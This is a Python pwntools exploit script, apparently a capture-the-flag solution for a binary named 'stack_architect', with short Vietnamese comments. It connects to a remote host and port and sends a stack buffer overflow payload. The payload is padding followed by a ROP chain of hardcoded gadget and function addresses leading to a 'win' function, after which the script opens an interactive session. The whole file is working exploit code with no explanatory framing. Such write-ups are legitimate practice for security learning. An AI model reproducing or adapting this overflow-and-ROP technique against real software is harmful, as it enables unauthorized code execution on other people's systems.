from pwn import *
sh=remote("45.122.249.68",10018)   

# sh = process("./stack_architect")

# Địa chỉ leak được trong quá trình debug và tìm Rop Gadget
pop = p32(0x08049423) 
a=p32(0x20010508)
v=p32(0x8052001)

# Infor func
func1=p32(0x804929e) 
func2= p32(0x80492fe) 
win=p32(0x8049216)

# Tổng số byte cần đè buffer là 88 (ret_addr-buffer)
payload = b'A'*4 + b"I'm sorry, don't leave me, I want you here with me ~~"
payload += b'\x00'*31
payload+= func1 + func1 + pop + a +  pop +  v + func2 + win
sh.sendline(payload)
sh.interactive()

